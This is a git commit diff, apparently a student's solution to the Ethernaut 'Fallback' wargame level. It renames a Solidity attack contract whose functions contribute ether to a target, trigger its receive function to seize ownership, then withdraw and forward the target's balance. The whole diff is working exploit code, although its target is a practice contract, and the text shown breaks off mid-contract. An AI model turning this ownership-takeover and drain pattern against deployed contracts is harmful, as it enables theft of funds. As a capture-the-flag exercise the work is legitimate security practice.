e59c6e547e9dae4093014127095c8dac95b7b975
gaavar <gaavar@umich.edu>
2022-05-09 19:18:39 -0400

    hacked ethernaut fallback

--- 1-fallback.sol
+++ 1-fallback.sol
@@ -1,24 +1,25 @@
 // SPDX-License-Identifier: MIT
 pragma solidity >=0.8.0 <0.9.0;
 
-contract ChallengeX {
-    address payable challengeInstance;
-    constructor(address payable _challengeInstance) {
-        challengeInstance = _challengeInstance;
+contract ChallengeFallback {
+    address payable fallbackInstance;
+    constructor(address payable _fallbackInstance) {
+        fallbackInstance = _fallbackInstance;
     }
-    function attack() public payable {
+    function becomeOwner() public payable {
         bytes memory payload = abi.encodeWithSignature('contribute()');
-        (bool success,) = address(challengeInstance).call{value: msg.value/2}(payload);
+        (bool success,) = address(fallbackInstance).call{value: msg.value/2}(payload);
         require(success);
         bytes memory payload2 = abi.encodeWithSignature('receive()');
-        (bool success2,) = address(challengeInstance).call{value: msg.value/2}(payload2);
+        (bool success2,) = address(fallbackInstance).call{value: msg.value/2}(payload2);
         require(success2);
     }
 
     function withdrawFunds() public {
         bytes memory payload3 = abi.encodeWithSignature('withdraw()');
-        (bool success3,) = address(challengeInstance).call(payload3);
+        (bool success3,) = address(fallbackInstance).call(payload3);
         require(success3);
+        payable(address(msg.sender)).transfer(address(this).balance);
     }
 
     receive() external payable {
